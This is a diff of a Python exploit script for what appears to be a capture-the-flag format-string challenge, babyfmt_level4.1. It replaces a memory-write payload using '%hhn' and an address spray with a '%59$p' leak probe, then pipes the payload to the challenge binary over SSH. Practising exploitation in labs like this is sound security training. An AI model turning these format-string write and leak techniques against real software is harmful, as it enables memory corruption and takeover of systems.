@@ -10,18 +10,9 @@ SSH = [
     "/challenge/babyfmt_level4.1",
 ]
 
-idx = 59
-fmt = ("%p " * 80) + "|%125c%59$hhn"
+fmt = b"|%59$p"
 
-chunks = []
-for k in range(32):
-    if k == 0:
-        chunks.append(struct.pack("<Q", ADDR))
-    else:
-        chunks.append(b"A" * 8)
-spray = b"".join(chunks)
-
-payload = fmt.encode() + spray
+payload = fmt + struct.pack("<Q", ADDR)
 
 res = subprocess.run(SSH, input=payload, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
 print(res.stdout.decode("latin-1", errors="ignore"))
